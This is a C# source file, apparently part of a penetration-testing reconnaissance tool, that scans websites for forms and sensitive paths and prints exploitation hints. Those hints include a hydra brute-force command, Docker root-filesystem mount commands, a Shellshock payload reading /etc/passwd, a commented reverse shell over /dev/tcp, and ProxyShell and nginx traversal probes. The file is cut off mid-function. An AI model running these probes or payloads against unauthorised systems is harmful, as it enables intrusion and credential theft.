using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using System.Text.RegularExpressions;

namespace Reecon
{
    class Web
    {
        static string scanURL = "";
        static List<string> fullPageList = new List<string>();
        public static void GetInfo(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Web Usage: reecon -web http://site.com/");
                return;
            }
            scanURL = args[1];
            if (!scanURL.StartsWith("http"))
            {
                Console.WriteLine("Invalid URL - Must start with http");
                return;
            }

            Console.WriteLine("Scanning...");

            // First - Scan the base page
            var httpInfo = Web.GetHTTPInfo(scanURL);
            string pageText = httpInfo.PageText;
            if (httpInfo.AdditionalInfo != null)
            {
                Console.WriteLine("- " + httpInfo.AdditionalInfo);
            }
            else
            {
                string pageInfo = FindInfo(pageText);
                // Add a newline if it returns something
                pageInfo += pageInfo != "" ? Environment.NewLine : "";
                pageInfo += FindLinks(pageText); // Todo: Recursive
                                                 // TODO: Auto SQLi - Web.GetInfo(new[] { "-web", "http://testphp.vulnweb.com/" });
                string parsedHTTPInfo = ParseHTTPInfo(httpInfo.StatusCode, httpInfo.PageTitle, httpInfo.PageText, httpInfo.DNS, httpInfo.Headers, httpInfo.SSLCert, httpInfo.URL);
                Console.WriteLine(parsedHTTPInfo);
                if (pageInfo.Trim() != "")
                {
                    Console.WriteLine(pageInfo);
                }

                // Then find common files
                Console.WriteLine("Searching for common files...");

                string commonFiles = FindCommonFiles(scanURL);
                if (commonFiles.Trim() != String.Empty)
                {
                    Console.WriteLine(commonFiles);
                }
            }
            Console.WriteLine("Web Info Scan Finished");
        }

        public static string FindInfo(string pageText, bool doubleDash = false)
        {
            string foundInfo = "";
            if (pageText == null)
            {
                Console.WriteLine("ReeDebug - Web.FindInfo - pageText is null - WTF?");
                return "";
            }
            if (pageText.Trim() != "")
            {
                foundInfo += FindFormData(pageText);
                foundInfo += FindEmails(pageText, doubleDash);
                return foundInfo.Trim(Environment.NewLine.ToCharArray());
            }
            return "";
        }

        private static string FindFormData(string text)
        {
            // This is very hacky and will probably break
            // I can't just use the WebBrowser control since it's not cross-platform on devices with no GUI
            string returnText = "";
            try
            {
                if (text.Contains("<form"))
                {
                    text = text.Remove(0, text.IndexOf("<form"));
                    if (text.Contains("</form>"))
                    {
                        returnText += "- Form Found" + Environment.NewLine;
                        text = text.Substring(0, text.IndexOf("</form>"));

                        // Form title / actions
                        string formHeader = text.Substring(0, text.IndexOf(">"));
                        if (formHeader.Replace(" ", "").Contains("method=\""))
                        {
                            string formMethod = formHeader.Remove(0, formHeader.IndexOf("method"));
                            formMethod = formMethod.Remove(0, formMethod.IndexOf("\"") + 1);
                            formMethod = formMethod.Substring(0, formMethod.IndexOf("\""));
                            returnText += "-- Method: " + formMethod + Environment.NewLine;
                        }
                        if (formHeader.Replace(" ", "").Contains("action=\""))
                        {
                            string formAction = formHeader.Remove(0, formHeader.IndexOf("action"));
                            formAction = formAction.Remove(0, formAction.IndexOf("\"") + 1);
                            formAction = formAction.Substring(0, formAction.IndexOf("\""));
                            returnText += "-- Action: " + formAction + Environment.NewLine;
                        }

                        // Inputs
                        List<string> inputs = text.Split("<input").ToList();
                        inputs = inputs.Where(x => !x.StartsWith("<form")).ToList();
                        inputs = inputs.Where(x => !x.Contains("\"hidden\"")).ToList(); // Some additional properties - Not related to what the user sees
                        string username = null;
                        string password = null;
                        foreach (string item in inputs)
                        {
                            // Textbox
                            if (item.Replace(" ", "").Contains("type=\"text\""))
                            {
                                returnText += "-- Textbox Discovered" + Environment.NewLine;
                                if (item.Contains(" name=\""))
                                {
                                    string textBoxName = item.Remove(0, item.IndexOf("name"));
                                    textBoxName = textBoxName.Remove(0, textBoxName.IndexOf("\"") + 1);
                                    textBoxName = textBoxName.Substring(0, textBoxName.IndexOf("\""));
                                    returnText += $"--- Name: {textBoxName}" + Environment.NewLine;
                                    username = textBoxName;
                                }
                            }

                            // Password Box
                            if (item.Replace(" ", "").Contains("type=\"password\""))
                            {
                                returnText += "-- Password Input Discovered" + Environment.NewLine;
                                // Textbox
                                if (item.Contains(" name=\""))
                                {
                                    string textBoxName = item.Remove(0, item.IndexOf("name"));
                                    textBoxName = textBoxName.Remove(0, textBoxName.IndexOf("\"") + 1);
                                    textBoxName = textBoxName.Substring(0, textBoxName.IndexOf("\""));
                                    returnText += $"--- Name: {textBoxName}" + Environment.NewLine;
                                    password = textBoxName;
                                }
                            }
                        }

                        // Submits
                        List<string> submitButtons = text.Split("<button").ToList();
                        submitButtons = submitButtons.Where(x => !x.StartsWith("<form")).ToList();
                        submitButtons = submitButtons.Where(x => x.Contains("\"submit\"")).ToList();

                        // This will only work in the best of cases
                        if ((inputs.Count == 3 || (inputs.Count == 2 && submitButtons.Count == 1)) && username != null && password != null)
                        {
                            returnText += "-- " + "Possible Login Form Found".Recolor(Color.Orange) + Environment.NewLine;
                            returnText += "--- " + $"hydra -l logins.txt -p passwords.txt 127.0.0.1 http-form-post \"/folder/post.php:{username}=^USER^&{password}=^PASS^:Invalid password error here\"".Recolor(Color.Orange) + Environment.NewLine;
                        }
                    }
                }
            }
            catch (NullReferenceException)
            {
                Console.WriteLine($"Rare NRE in Web.FindFormData with text: {text} - Bug Reelix");
            }
            return returnText;
        }

        private static string FindEmails(string text, bool doubleDash)
        {
            string returnInfo = "";

            // Do not change this Regex
            Regex emailRegex = new(@"\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b", RegexOptions.IgnoreCase);
            MatchCollection emailMatches = emailRegex.Matches(text);
            List<string> matchList = General.MatchCollectionToList(emailMatches);
            foreach (string match in matchList)
            {
                if (doubleDash)
                {
                    returnInfo += "-- EMail: " + match + Environment.NewLine;
                }
                else
                {
                    returnInfo += "- EMail: " + match + Environment.NewLine;
                }
            }
            return returnInfo;
        }

        private static string FindLinks(string pageText, bool doubleDash = false)
        {
            List<string> currentPageList = new List<string>();
            // Find all matches
            MatchCollection m1 = Regex.Matches(pageText, @"(<a.*?>.*?</a>)", RegexOptions.Singleline);

            // Loop over each match.
            foreach (Match m in m1)
            {
                string value = m.Groups[1].Value;
                string href = "";

                // Get href attribute.
                Match m2 = Regex.Match(value, @"href=\""(.*?)\""", RegexOptions.Singleline);
                if (m2.Success)
                {
                    href = m2.Groups[1].Value;
                }

                // Remove inner tags from text.
                string text = Regex.Replace(value, @"\s*<.*?>\s*", "", RegexOptions.Singleline);

                if (href.StartsWith("/"))
                {
                    if (scanURL.EndsWith("/"))
                    {
                        href = scanURL + href.TrimStart('/');
                        if (!href.StartsWith(scanURL))
                        {
                            href = scanURL + href;
                        }
                    }
                }
                if (href.Length > 1 && !href.StartsWith("#")) // Section - Not actual URL
                {
                    string info = doubleDash ? "-- " : "- ";
                    info += $"{text}: {href}";
                    if (!currentPageList.Contains(info))
                    {
                        currentPageList.Add(info);
                        Uri parentURL = new Uri(scanURL);
                        if (href.StartsWith("http"))
                        {
                            Uri theURL = new Uri(href);
                            // Don't add off-host link
                            if (theURL.Host == parentURL.Host)
                            {
                                fullPageList.Add(theURL.PathAndQuery);
                            }
                        }
                        else
                        {
                            fullPageList.Add(href);
                        }
                    }
                }

            }
            // Convert to a nice string to return
            string returnInfo = "";
            foreach (string page in currentPageList)
            {
                returnInfo += page + Environment.NewLine;
            }
            return returnInfo.Trim(Environment.NewLine.ToCharArray());
        }

        private static void FindNewPages(string pageToScan)
        {
            var pageText = GetHTTPInfo(pageToScan).PageText;
            FindLinks(pageText, false);
        }

        public static string FindCommonFiles(string url)
        {
            string returnText = "";

            if (!url.EndsWith("/"))
            {
                url += "/";
            }

            // Wildcard test
            int notFoundLength = -1;
            int notFoundLength2 = -1; // For times when the NotFound page contains the search text
            int notFoundLengthPHP = -1;
            int notFoundLengthPHP2 = -1;
            int ignoreFileLength = -1;
            int ignoreFolderLength = -1;
            // Currently google-able - Need to randomise
            string wildcardURL = url + "be0df04b-f5ff-4b4f-af99-00968cf08fed";
            bool ignoreNotFound = false; // To implement later if there is consistently too much varition in 404 content length (Drupal is a major offender here...)
            bool ignoreRedirect = false;
            bool ignoreForbidden = false;
            bool ignoreBadRequest = false;
            // Exploits
            bool nginxAliasTraversalChecked = false;

            // Testing Wildcards
            var pageResult = Web.GetHTTPInfo(wildcardURL);
            string pageResultText = pageResult.PageText;
            if (pageResult.StatusCode == HttpStatusCode.OK)
            {
                ignoreFileLength = pageResultText.Length;
                returnText += $"- Wildcard paths such as {wildcardURL} return - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.Redirect || pageResult.StatusCode == HttpStatusCode.Moved)
            {
                ignoreRedirect = true;
                returnText += $"- Wildcard paths such as {wildcardURL} redirect - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.Forbidden)
            {
                ignoreForbidden = true;
                returnText += $"- Wildcard paths such as {wildcardURL} are forbidden - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.BadRequest)
            {
                ignoreBadRequest = true;
                returnText += $"- Wildcard paths such as {wildcardURL} return a bad request - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.NotFound)
            {
                notFoundLength = pageResultText.Length;
                notFoundLength2 = pageResultText.Replace("be0df04b-f5ff-4b4f-af99-00968cf08fed", "").Length;
                // returnText += "NFL 1: " + notFoundLength + Environment.NewLine;
                // returnText += "NFL 2: " + notFoundLength2 + Environment.NewLine;
            }

            // PHP wildcards can be differnt
            bool ignorePHP = false;
            bool ignorePHPRedirect = false;
            string phpWildcardURL = wildcardURL + ".php";
            pageResult = Web.GetHTTPInfo(phpWildcardURL);
            pageResultText = pageResult.PageText;
            if (pageResult.StatusCode == HttpStatusCode.OK)
            {
                ignorePHP = true;
                returnText += $"- .php wildcard paths such as {phpWildcardURL} return - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.Redirect || pageResult.StatusCode == HttpStatusCode.Moved)
            {
                ignorePHPRedirect = true;
                returnText += $"- .php wildcard paths such as {phpWildcardURL} redirect - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.NotFound)
            {
                notFoundLengthPHP = pageResultText.Length;
                notFoundLengthPHP2 = pageResultText.Replace("be0df04b-f5ff-4b4f-af99-00968cf08fed.php", "").Length;
                // returnText += "Using PHP NFL" + Environment.NewLine;
                // returnText += "PHP NFL 1: " + notFoundLength + Environment.NewLine;
                // returnText += "PHP NFL 2: " + notFoundLength2 + Environment.NewLine;
            }

            // Folder wildcards can also be different
            var folderWildcard = Web.GetHTTPInfo(wildcardURL + "/");
            if (folderWildcard.StatusCode == HttpStatusCode.OK)
            {
                ignoreFolderLength = folderWildcard.PageText.Length;
            }

            // Mini gobuster :p
            List<string> commonFiles = new()
            {
                // robots.txt - Of course
                "robots.txt",
                // Most likely invalid folder for test purposes
                "woof/",
                // Common hidden folders
                "hidden/",
                "secret/",
                "backup/",
                "backups/",
                "dev/",
                "development/", 
                // Common Index files
                "index.php",
                "index.html",
                "index.jsp",
                "index.nginx-debian.html", // If they didn't remove the default nginx config file
                // Common upload paths
                "upload/",
                "uploads/",
                "upload.html",
                "upload.php",
                // Common images folder
                "images/",
                // Hidden mail server
                "mail/",
                // Admin stuff
                "admin.php",
                "admin/",
                "administrator/",
                "manager/",
                // Access details
                ".htaccess",
                // Git repo
                ".git/HEAD",
                // SSH
                ".ssh/id_rsa",
                // Bash History
                ".bash_history",
                // NodeJS Environment File
                ".env",
                // PHP Composer configuration file
                "composer.json",
                // General info file
                ".DS_STORE",
                // Wordpress stuff
                "blog/",
                "wordpress/",
                "wordpress/wp-config.php.bak",
                "wp-config.php",
                "wp-config.php.bak",
                // Other blog stuff
                "blogs/",
                // phpmyadmin
                "phpmyadmin/",
                "phpMyAdmin", // Some are case sensitive
                // Kibana
                "app/kibana",
                // Bolt CMS
                "bolt-public/img/bolt-logo.png",
                // Shellshock and co
                "cgi-bin/", 
                // Well-Known
                ".well-known/", // https://www.google.com/.well-known/security.txt
                // Docker and other common versions
                "version",
                "version.txt",
                // PHP stuff
                "vendor/",
                "phpinfo.php", // Hopefully no-one has this uploaded :p
                // Java - Spring
                "functionRouter",
                // APIs
                "api",
                // A bit CTFy
                "server-status",
                "LICENSE",
                "help",
                "info",
                "files/"
            };

            if (ignorePHP)
            {
                commonFiles.RemoveAll(x => x.EndsWith(".php"));
            }
            // returnText += "NFL Len 1: " + notFoundLength + Environment.NewLine;
            // returnText += "NFL Len 2: " + notFoundLength2 + Environment.NewLine;
            foreach (string file in commonFiles)
            {
                string path = url + file;
                var response = Web.GetHTTPInfo(path);
                if (response.StatusCode == HttpStatusCode.OK)
                {
                    // Since it's readable - Let's deal with it!
                    try
                    {
                        string pageText = response.PageText;
                        // Ack
                        if (pageText.Length != notFoundLength &&
                            pageText.Replace(file, "").Length != notFoundLength2 &&
                            pageText.Length != ignoreFileLength &&
                            (!file.EndsWith("/") || (pageText.Length != ignoreFolderLength)))
                        {
                            returnText += "- " + $"Common Path is readable: {url}{file} (Len: {pageText.Length})".Recolor(Color.Orange) + Environment.NewLine;
                            // Specific case for robots.txt since it's common and extra useful
                            if (file == "robots.txt")
                            {
                                foreach (var line in pageText.Split(Environment.NewLine.ToCharArray()))
                                {
                                    if (line != "")
                                    {
                                        returnText += "-- " + line + Environment.NewLine;
                                    }
                                }
                            }
                            // Bolt
                            else if (file == "bolt-public/img/bolt-logo.png")
                            {
                                returnText += "-- Bolt CMS!".Recolor(Color.Orange) + Environment.NewLine;
                                returnText += $"-- Admin Page: {url}bolt" + Environment.NewLine;
                                returnText += "-- If you get details and the version is 3.6.* or 3.7: https://www.rapid7.com/db/modules/exploit/unix/webapp/bolt_authenticated_rce OR https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py/blob/master/exploit.py (3.7.0)" + Environment.NewLine;
                            }
                            // Docker Engine
                            else if (file == "version" && pageText.Contains("Docker Engine - Community"))
                            {
                                // Port 2375
                                returnText += "-- Docker Engine Found!".Recolor(Color.Orange) + Environment.NewLine;
                                string dockerURL = url.Replace("https://", "tcp://").Replace("http://", "tcp://").Trim('/');
                                returnText += $"--- List running Dockers: docker -H {dockerURL} ps" + Environment.NewLine;
                                returnText += $"--- List Docker Images: docker -H {dockerURL} images" + Environment.NewLine;
                                returnText += $"--- Mount Root FS: docker -H {dockerURL} run -it -v /:/woof imageName:ver bash" + Environment.NewLine;
                            }
                            // Git repo!
                            else if (file == ".git/HEAD")
                            {
                                returnText += "-- Git repo found!" + Environment.NewLine;

                                // https://github.com/arthaud/git-dumper/issues/9
                                try
                                {
                                    if (DownloadString($"{url}.git/").Text.Contains("../"))
                                    {
                                        // -q: Quiet (So the console doesn't get spammed)
                                        // -r: Download everything
                                        // -np: But don't go all the way backwards
                                        // -nH: So you only have the ".git" folder and not the IP folder as well
                                        returnText += $"--- Download the repo: wget -q -r -np -nH {url}.git/" + Environment.NewLine;
                                        returnText += "--- Get the logs: git log --pretty=format:\"%h - %an (%ae): %s %b\"" + Environment.NewLine;
                                        // git log --pretty=format:"%h - %an (%ae): %s %b"
                                        // db.sqlite3
                                        returnText += "--- Show a specific commit: git show 2eb93ac (Press q to close)" + Environment.NewLine;
                                        // https://stackoverflow.com/questions/34751837/git-can-we-recover-deleted-commits
                                        returnText += "--- Find deleted commits: git reflog" + Environment.NewLine;

                                        continue;
                                    }
                                }
                                catch { }
                                returnText += "--- Download: https://raw.githubusercontent.com/arthaud/git-dumper/master/git_dumper.py" + Environment.NewLine;
                                returnText += $"--- Run: python3 git_dumper.py {url}{file} .git" + Environment.NewLine;
                                returnText += "--- Get the logs: git log --pretty=format:\"%h - %an (%ae): %s %b\"" + Environment.NewLine;
                                returnText += "--- Show a specific commit: git show 2eb93ac (Press q to close)" + Environment.NewLine;
                            }
                            // Kibana!
                            else if (file == "app/kibana")
                            {
                                returnText += "-- Kibana!" + Environment.NewLine;
                                try
                                {
                                    string toCheck = $"{url}{file}";
                                    string pageData = DownloadString($"{url}{file}").Text;
                                    if (pageData.IndexOf("&quot;version&quot;:&quot;") != -1)
                                    {
                                        string versionText = pageData.Remove(0, pageData.IndexOf("&quot;version&quot;:&quot;") + 26);
                                        versionText = versionText.Substring(0, versionText.IndexOf("&quot;"));
                                        returnText += "--- Version: " + versionText + Environment.NewLine;
                                        returnText += "---- Kibana versions before 5.6.15 and 6.6.1 -> CVE-2019-7609 -> https://github.com/mpgn/CVE-2019-7609" + Environment.NewLine;
                                    }
                                    else
                                    {
                                        returnText += $"--- Version: {url}{file}#/management/" + Environment.NewLine;
                                    }
                                }
                                catch
                                {
                                    returnText += $"--- Version: {url}{file}#/management/" + Environment.NewLine;
                                }
                                returnText += $"--- Elasticsearch Console: {url}{file}#/dev_tools/console" + Environment.NewLine;
                                returnText += "---- General Info: GET /" + Environment.NewLine;
                                returnText += "---- Get Indices: GET /_cat/indices?v" + Environment.NewLine;
                                // These aren't meant to be params
                                returnText += "---- Get Index Info: GET /{index}/_search/?pretty&size={docs.count}" + Environment.NewLine;
                            }
                            // Shellshock
                            else if (file == "cgi-bin/")
                            {
                                // curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://path/cgi-bin/valid.cgi
                                returnText += "-- Possible Shellshock - Search for valid files inside here" + Environment.NewLine;
                                returnText += "--- // Test: curl -H 'User-Agent: () { :;}; echo; /bin/cat /etc/passwd;' http://1.2.3.4/cgi-bin/valid.cgi" + Environment.NewLine;
                                // Shell: curl -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.6.2.249/9001 0>&1;" http://10.10.175.194/cgi-bin/valid.cgi"
                            }
                            // Directory listing
                            else if (response.PageTitle.StartsWith("Index of /"))
                            {
                                returnText += "-- " + "Open directory listing".Recolor(Color.Orange) + Environment.NewLine;

                                // nginx Alias Traversal
                                if (!nginxAliasTraversalChecked)
                                {
                                    if (response.Headers.Any(x => x.Key == "Server" && x.Value.Any(x => x.StartsWith("nginx"))))
                                    {
                                        string traversalPath = path.Remove(path.Length - 1, 1) + "../";
                                        var traversalResponse = Web.GetHTTPInfo(traversalPath);
                                        if (traversalResponse.PageTitle.Contains("Index of "))
                                        {
                                            returnText += "--- " + "nginx Alias Traversal!!!".Recolor(Color.Orange) + Environment.NewLine;
                                            returnText += "--- " + traversalPath.Recolor(Color.Orange) + Environment.NewLine;
                                        }
                                    }
                                    nginxAliasTraversalChecked = true;
                                }
                            }
                            // Generic
                            else
                            {
                                string usefulInfo = Web.FindInfo(pageText, true);
                                if (usefulInfo.Trim(Environment.NewLine.ToCharArray()) != "")
                                {
                                    returnText += usefulInfo + Environment.NewLine;
                                }
                            }
                        }

                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Bug Reelix - HTTP.FindCommonFiles Error: " + ex.Message + Environment.NewLine);
                    }
                }
                else if (response.StatusCode == HttpStatusCode.BadRequest)
                {
                    // Bad Request is still useful - Unless we're ignoring it
                    if (!ignoreBadRequest)
                    {
                        returnText += $"- Common Path is a Bad Request: {url}{file}" + Environment.NewLine;
                    }
                }
                else if (response.StatusCode == HttpStatusCode.Forbidden)
                {
                    // Forbidden is still useful - Unless we're ignoring it
                    if (!ignoreForbidden)
                    {
                        returnText += $"- Common Path is Forbidden: {url}{file}" + Environment.NewLine;
                    }
                }
                else if (response.StatusCode == HttpStatusCode.Redirect || response.StatusCode == HttpStatusCode.Moved)
                {
                    if (ignoreRedirect)
                    {
                        continue;
                    }
                    if (file.EndsWith(".php") && ignorePHPRedirect)
                    {
                        continue;
                    }
                    returnText += $"- Common Path redirects: {url}{file}" + Environment.NewLine;
                    if (response.Headers != null && response.Headers.Location != null)
                    {
                        returnText += $"-- Redirection Location: {response.Headers.Location}" + Environment.NewLine;

                        // If it's an IP then it's probably redirecting to a host
                        if (IPAddress.TryParse(url, out _))
                        {
                            returnText += $"--- Original is an IP - Bug Reelix to fix!" + Environment.NewLine;
                        }
                    }
                }
                else if (response.StatusCode == HttpStatusCode.Unauthorized)
                {
                    returnText += $"- Common path requires authentication: {url}{file}" + Environment.NewLine;
                    var headers = response.Headers;
                    if (headers.Contains("WWW-Authenticate"))
                    {
                        returnText += $"-- WWW-Authenticate: {headers.GetValues("WWW-Authenticate").First()}" + Environment.NewLine;
                    }
                }
                else if (response.StatusCode == 0)
                {
                    returnText += $"- " + "Host timed out - Unable to enumerate".Recolor(Color.Red);
                    break;
                }
                else if (response.StatusCode == HttpStatusCode.InternalServerError)
                {
                    returnText += $"- Common path throws an Internal Server Error: {url}{file}" + Environment.NewLine;
                    if (file == "functionRouter")
                    {
                        returnText += "-- " + "An Internal Server Error on functionRouter indicates that it's probably a Java Spring app - You should investigate this!".Recolor(Color.Orange) + Environment.NewLine;
                    }
                }
                else if (response.StatusCode == HttpStatusCode.TemporaryRedirect)
                {
                    // Normally just http -> https
                    var headers = response.Headers;
                    if (url.StartsWith("http") && headers.Contains("Location") && (headers.Location.ToString().StartsWith("https")))
                    {
                        continue;
                    }
                    else
                    {
                        // If it's not - Display it
                        Console.WriteLine($"-- Weird TemporaryRedirect: {url}{file}" + Environment.NewLine);
                    }
                }
                else if (response.StatusCode == HttpStatusCode.NotFound && response.Headers.Contains("Docker-Distribution-Api-Version"))
                {
                    string dockerVersion = response.Headers.GetValues("Docker-Distribution-Api-Version").First();
                    returnText += "-- Docker Detected - API Version: " + dockerVersion + Environment.NewLine;
                    if (dockerVersion == "registry/2.0")
                    {
                        string repoText = DownloadString($"{url}v2/_catalog").Text;
                        if (repoText.Contains("repositories"))
                        {
                            try
                            {
                                var repoList = JsonDocument.Parse(repoText);
                                foreach (var item in repoList.RootElement.GetProperty("repositories").EnumerateArray())
                                {
                                    returnText += "--- Repo Found: " + item + Environment.NewLine;
                                    string tagList = DownloadString($"{url}v2/" + item + "/tags/list").Text;
                                    tagList = tagList.Replace("\r", "").Replace("\n", ""); // Sometimes has a built in newline for some reason
                                    returnText += "---- Tags Found: " + tagList + Environment.NewLine;
                                    returnText += $"------> {url}v2/{item}/manifests/tagNameHere (End of the above)";
                                    // /v2/cmnatic/myapp1/tags/list
                                    // --> /cmnatic/myapp1/manifests/notsecure
                                }
                                // Every notfound will be the same
                                break;
                            }
                            catch
                            {
                                returnText += "--- Unable to deserialize repo - Bug Reelix!" + Environment.NewLine;
                                break;
                            }
                        }
                        returnText += repoText;
                    }
                    else
                    {
                        returnText += "-- Unknown Docker API Version - Bug Reelix!";
                    }
                }
                // It's a 404, but not a native 404
                else if (response.StatusCode == HttpStatusCode.NotFound &&
                    !ignoreNotFound &&
                    response.PageText.Length != notFoundLength &&
                    response.PageText.Replace(file, "").Length != notFoundLength2)
                {
                    if (file.EndsWith(".php") && response.PageText.Length == notFoundLengthPHP ||
                    response.PageText.Replace(file, "").Length == notFoundLengthPHP2)
                    {
                        continue;
                    }
                    returnText += $"-- Maybe, Maybe Not: {url}{file}" + Environment.NewLine;
                    // returnText += "-- Page Len: " + response.PageText.Length + Environment.NewLine;
                    // returnText += "-- Page Len Repl: " + response.PageText.ToLower().Replace(file.ToLower(), "").Length + Environment.NewLine;
                    string pageText = response.PageText.Trim();
                    pageText = pageText.Length > 250 ? pageText.Substring(0, 250) + "..." : pageText;
                    returnText += $"--- {pageText}" + Environment.NewLine;
                }
                // Something else - Just print the response
                else if (response.StatusCode != HttpStatusCode.NotFound &&
                    response.StatusCode != HttpStatusCode.TooManyRequests &&
                    response.StatusCode != HttpStatusCode.ServiceUnavailable)
                {
                    if (response.PageText != "")
                    {
                        returnText += $"-- Page Text: {response.PageText}" + Environment.NewLine;
                    }
                }
            }
            return returnText.Trim(Environment.NewLine.ToArray());
        }

        public static (HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, HttpResponseHeaders Headers, X509Certificate2 SSLCert, string URL, string AdditionalInfo) GetHTTPInfo(string url, string userAgent = null, string cookie = null)
        {
            string pageTitle = "";
            string pageText = "";
            string dns = "";
            HttpStatusCode statusCode = new();
            HttpResponseHeaders headers = null;
            X509Certificate2 cert = null;

            // Ignore invalid SSL Cert
            var httpClientHandler = new HttpClientHandler()
            {
                UseCookies = false // Needed for a custom Cookie header
            };
            httpClientHandler.ServerCertificateCustomValidationCallback += (sender, certificate, chain, sslPolicyErrors) =>
            {
                if (certificate != null)
                {
                    cert = new X509Certificate2(certificate);
                }
                return true;
            };
            httpClientHandler.AllowAutoRedirect = false;

            HttpClient httpClient = new HttpClient(httpClientHandler);
            Uri theURL = new Uri(url);
            HttpRequestMessage httpClientRequest = new HttpRequestMessage(HttpMethod.Get, theURL);
            // Optional params
            if (userAgent != null)
            {
                httpClientRequest.Headers.UserAgent.TryParseAdd(userAgent);
            }
            if (cookie != null)
            {
                // Console.WriteLine("Web.cs Debug - Setting Cookie to " +  cookie);
                httpClientRequest.Headers.Add("Cookie", cookie);
            }
            try
            {
                httpClient.Timeout = TimeSpan.FromMilliseconds(5000);
                HttpResponseMessage httpClientResponse = httpClient.Send(httpClientRequest);
                statusCode = httpClientResponse.StatusCode;
                dns = theURL.DnsSafeHost;
                headers = httpClientResponse.Headers;
                using (StreamReader readStream = new(httpClientResponse.Content.ReadAsStream()))
                {
                    pageText = readStream.ReadToEnd();
                }
            }
            catch (TimeoutException ex)
            {
                Console.WriteLine("HttpClient Timeout Error: " + ex.Message);
            }
            catch (WebException wex)
            {
                Console.WriteLine("Here: " + wex.Message);
            }
            catch (Exception ex)
            {
                if (ex.Message.StartsWith("The SSL connection could not be established, see inner exception"))
                {
                    // Not valid
                    return (statusCode, null, null, null, null, null, null, null);
                }
                else if (ex.Message.StartsWith("The request was canceled due to the configured HttpClient.Timeout of "))
                {
                    // Why is this not caught in the TimeoutException...
                    Console.WriteLine($"- Odd TimeoutError - {url} timed out: {ex.Message} - Bug Reelix".Recolor(Color.Red));
                    return (statusCode, null, null, null, null, null, url, "Timed Out :(");
                }
                else if (ex.InnerException != null && ex.InnerException.GetType().IsAssignableFrom(typeof(IOException)))
                {
                    if (ex.InnerException.Message == "The response ended prematurely.")
                    {
                        return (HttpStatusCode.BadRequest, null, null, null, null, null, url, "WTF");
                    }
                    else
                    {
                        // Soome weird cert thing
                        // * schannel: failed to read data from server: SEC_E_CERT_UNKNOWN (0x80090327) - An unknown error occurred while processing the certificate.
                        return (statusCode, null, null, null, null, null, url, "WeirdSSL");
                    }
                }
                else if (ex.InnerException != null && ex.InnerException.GetType().IsAssignableFrom(typeof(SocketException)))
                {
                    if (ex.InnerException.Message == "Name or service not known")
                    {
                        return (statusCode, null, null, null, null, null, url, $"The url {url} does not exist - Maybe fix your /etc/hosts file?");
                    }
                    else
                    {
                        Console.WriteLine("Reecon.Web - Fatal Exception - Bug Reelix - SocketException: " + ex.InnerException.Message);
                    }
                }
                // An error occurred while sending the request.System.Net.Http.HttpIOException: The response ended prematurely. (ResponseEnded) ???
                // Looks like I came across this before, but couldn't figure it out then either
                else
                {
                    Console.WriteLine("HttpClient rewrite had an error: " + ex.Message + ex.InnerException);
                }
            }
            // Returns nothing on Twitter since they set their titles weirdly
            if (pageText.Contains("<title>") && pageText.Contains("</title>"))
            {
                pageTitle = pageText.Remove(0, pageText.IndexOf("<title>") + "<title>".Length);
                pageTitle = pageTitle.Substring(0, pageTitle.IndexOf("</title>"));
            }
            return (statusCode, pageTitle, pageText, dns, headers, cert, url, null);
        }

        public static string ParseHTTPInfo(HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, HttpResponseHeaders Headers, X509Certificate2 SSLCert, string URL)
        {
            string toReturn = "";
            string urlPrefix = URL.StartsWith("https") ? "https" : "http";
            Uri theURI = new Uri(URL);
            string customPort = theURI.IsDefaultPort ? "" : ":" + theURI.Port.ToString();
            string baseURL = urlPrefix + "://" + DNS + customPort;
            string urlWithSlash = URL.EndsWith("/") ? URL : URL + "/";

            // Not OK - Check what's up
            if (StatusCode != HttpStatusCode.OK)
            {
                // There's a low chance that it will return a StatusCode that is not in the HttpStatusCode list in which case (int)StatusCode will crash
                if (StatusCode == HttpStatusCode.MovedPermanently)
                {
                    if (Headers != null && Headers.Location != null)
                    {
                        toReturn += "- Moved Permanently" + Environment.NewLine;
                        toReturn += "-> Location: " + Headers.Location + Environment.NewLine;
                        Headers.Remove("Location");
                    }
                }
                else if (StatusCode == HttpStatusCode.Redirect)
                {
                    if (Headers != null && Headers.Location != null)
                    {
                        toReturn += "- Redirect" + Environment.NewLine;
                        toReturn += "-> Location: " + Headers.Location + Environment.NewLine;

                        // ProxyShell / ProxyLogin
                        // CVE-2021-26855
                        if (Headers.Location.ToString().Contains("/owa/"))
                        {
                            // msmailprobe.go
                            // This vulnerability affects
                            // Exchange 2013 CU23 < 15.0.1497.15,
                            // Exchange 2016 CU19 < 15.1.2176.12, Exchange 2016 CU20 < 15.1.2242.5,
                            // Exchange 2019 CU8 < 15.2.792.13, Exchange 2019 CU9 < 15.2.858.9.
                            // Sample /owa/ - intext: url("/owa/auth/15.2.858/
                            // https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/windows/http/exchange_proxyshell_rce.rb
                            var proxyShellInfo = Web.GetHTTPInfo(URL.Trim('/') + "/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com");
                            if (proxyShellInfo.StatusCode == HttpStatusCode.Redirect)
                            {
                                toReturn += "--> Possible Proxyshell / ProxyLogin!" + Environment.NewLine;
                                toReturn += "---> If you have an e-mail address, try: metasploit exploit/windows/http/exchange_proxyshell_rce" + Environment.NewLine;
